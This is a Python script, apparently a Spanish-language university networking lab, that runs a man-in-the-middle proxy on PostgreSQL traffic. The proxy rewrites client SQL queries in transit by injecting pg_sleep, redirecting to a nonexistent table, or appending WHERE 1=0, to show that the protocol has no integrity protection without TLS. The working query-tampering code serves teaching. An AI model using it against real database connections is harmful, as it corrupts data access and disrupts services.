#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================================
 mod_3_query.py  -  MODIFICACIÓN 3: contenido de la QUERY SQL
 Tarea 3 - Taller de Redes y Servicios (UDP)
----------------------------------------------------------------------------
 El proxy MITM intercepta los mensajes Query ('Q'), extrae el texto SQL
 (bytes 5.. hasta el \\x00) y lo reescribe, reconstruyendo el mensaje:
       'Q' + length(4) + sql_bytes + \\x00

   Caso A: cualquier SELECT  -> "SELECT pg_sleep(5);"
   Caso B: si hay FROM       -> reemplaza la tabla por "tabla_inexistente_xyz"
   Caso C: añade " WHERE 1=0" al final de la consulta

 FUNDAMENTACIÓN DEL COMPORTAMIENTO ESPERADO
 - Caso A: el cliente pide "SELECT 1" (latencia <1 ms) pero el servidor
   ejecuta pg_sleep(5): 5 s de latencia visible. Demuestra que el protocolo
   sin TLS NO tiene integridad de mensaje: un MITM reescribe consultas.
 - Caso B: el servidor responde 42P01 ("relation does not exist") aunque la
   consulta original del cliente era perfectamente válida.
 - Caso C: la consulta se ejecuta pero devuelve 0 filas; el cliente recibe un
   resultado vacío sin error, creyendo que la tabla no tiene datos.
============================================================================
"""
import os
import re
import sys
import time
import struct
import threading
import socket

from mitm_proxy import PgMITMProxy
from pg_client import MinimalPgClient

# ----------------------- CONFIGURACIÓN (editar aquí) -----------------------
SERVER_HOST = os.environ.get("SERVER_HOST", "servidor")
PG_PORT     = int(os.environ.get("PG_PORT", "5432"))
PROXY_PORT  = int(os.environ.get("PROXY_PORT", "5433"))
PG_USER     = os.environ.get("PG_USER", "taller")
PG_PASSWORD = os.environ.get("PG_PASSWORD", "tallerpass")
PG_DB       = os.environ.get("PG_DB", "tallerdb")
AUTO        = os.environ.get("MITM_AUTO", "1") != "0"
CAP_DIR     = os.environ.get("CAP_DIR", "/capturas")
OUT_FILE    = os.path.join(CAP_DIR, "mod3_output.txt")
# ---------------------------------------------------------------------------

# Cada caso define (descripción, consulta que envía el cliente, modo)
CASES = {
    "A": ("SELECT -> SELECT pg_sleep(5)", "SELECT 1", "sleep"),
    "B": ("FROM <tabla> -> FROM tabla_inexistente_xyz", "SELECT * FROM routers", "table"),
    "C": ("añadir WHERE 1=0", "SELECT * FROM routers", "where"),
}


class Tee:
    def __init__(self, path):
        self.terminal = sys.stdout
        try:
            self.file = open(path, "w", encoding="utf-8")
        except OSError:
            self.file = None

    def write(self, m):
        self.terminal.write(m)
        if self.file:
            self.file.write(m)

    def flush(self):
        self.terminal.flush()
        if self.file:
            self.file.flush()


def rewrite_sql(sql, mode):
    if mode == "sleep":
        if re.match(r"(?is)\s*select", sql):
            return "SELECT pg_sleep(5)"
        return sql
    if mode == "table":
        return re.sub(r"(?i)(\bFROM\s+)(\"?[\w\.]+\"?)",
                      r"\1tabla_inexistente_xyz", sql, count=1)
    if mode == "where":
        base = sql.rstrip().rstrip(";").rstrip()
        return base + " WHERE 1=0"
    return sql


def make_hook(mode):
    state = {"done": False}

    def hook(data):
        if not state["done"] and data[:1] == b"Q" and len(data) >= 5:
            state["done"] = True
            (length,) = struct.unpack(">I", data[1:5])
            body = data[5:1 + length]
            sql_orig = body.split(b"\x00")[0].decode("latin-1")
            sql_new = rewrite_sql(sql_orig, mode)
            print("   [hook] SQL original  del cliente : %r" % sql_orig)
            print("   [hook] SQL modificado al servidor: %r" % sql_new)
            new_body = sql_new.encode() + b"\x00"
            return b"Q" + struct.pack(">I", 4 + len(new_body)) + new_body
        return data
    return hook


def wait_port(host, port, tries=50):
    for _ in range(tries):
        try:
            s = socket.create_connection((host, port), timeout=0.2)
            s.close()
            return True
        except OSError:
            time.sleep(0.05)
    return False


def run_case(case_key):
    desc, client_sql, mode = CASES[case_key]
    port = PROXY_PORT + ord(case_key) - ord("A")
    print("\n" + "=" * 74)
    print(" CASO %s: %s" % (case_key, desc))
    print("=" * 74)

    proxy = PgMITMProxy(listen_port=port, server_host=SERVER_HOST,
                        server_port=PG_PORT,
                        client_to_server_hook=make_hook(mode), verbose=False)
    threading.Thread(target=proxy.start, daemon=True).start()
    wait_port("127.0.0.1", port)

    print("   Lo que el USUARIO cree enviar: %r" % client_sql)
    try:
        cli = MinimalPgClient("127.0.0.1", port, PG_USER, PG_PASSWORD, PG_DB,
                              timeout=10.0)
        cli.connect()
        res, ms = cli.simple_query(client_sql)
        print("   --- Lo que el CLIENTE observa como respuesta (%.0f ms) ---" % ms)
        if res.get("error"):
            print("       ErrorResponse -> %s" % res["error"])
        if res.get("cmd"):
            print("       CommandComplete: %s" % res["cmd"])
        if res.get("rows") is not None:
            print("       filas devueltas: %d" % len(res["rows"]))
            for r in res["rows"][:6]:
                print("           %s" % r)
        if res.get("closed"):
            print("       Conexión cerrada -> %s" % res["closed"])
        # Interpretación
        if mode == "sleep":
            print("   >> El usuario pidió 'SELECT 1' (instantáneo) pero esperó ~%.1f s."
                  % (ms / 1000.0))
        elif mode == "table":
            print("   >> El usuario consultó una tabla válida y recibió un error de tabla.")
        elif mode == "where":
            print("   >> El usuario esperaba 4 filas y recibió %d (resultado vaciado)."
                  % len(res.get("rows") or []))
        cli.close()
    except Exception as e:
        print("   La conexión terminó con -> %s: %s" % (type(e).__name__, e))
    finally:
        proxy.stop()
        time.sleep(0.2)


def main():
    if AUTO:
        sys.stdout = Tee(OUT_FILE)
    print("##########################################################################")
    print("# MODIFICACIÓN 3 - Contenido de la QUERY SQL (proxy MITM en :%d)" % PROXY_PORT)
    print("# Servidor real: %s:%d" % (SERVER_HOST, PG_PORT))
    print("##########################################################################")

    if not AUTO:
        case_key = os.environ.get("MITM_CASE", "A").upper()
        desc, client_sql, mode = CASES[case_key]
        print("[DEMO] Caso %s activo: %s" % (case_key, desc))
        print("[DEMO] Conéctese con:  psql -h <host_scapy> -p %d -U %s -d %s" %
              (PROXY_PORT, PG_USER, PG_DB))
        print("[DEMO] Ejecute por ejemplo:  %s;" % client_sql)
        proxy = PgMITMProxy(listen_port=PROXY_PORT, server_host=SERVER_HOST,
                            server_port=PG_PORT,
                            client_to_server_hook=make_hook(mode))
        try:
            proxy.start()
        except KeyboardInterrupt:
            proxy.stop()
        return

    for k in ("A", "B", "C"):
        run_case(k)

    print("\n" + "#" * 74)
    print("# Conclusión: sin TLS, el protocolo PostgreSQL no protege la INTEGRIDAD de")
    print("# las consultas. Un MITM puede inyectar latencia (pg_sleep), redirigir a")
    print("# tablas inexistentes o vaciar resultados (WHERE 1=0) sin que cliente ni")
    print("# servidor lo detecten. Es el argumento técnico para exigir sslmode=require.")
    print("#" * 74)


if __name__ == "__main__":
    main()
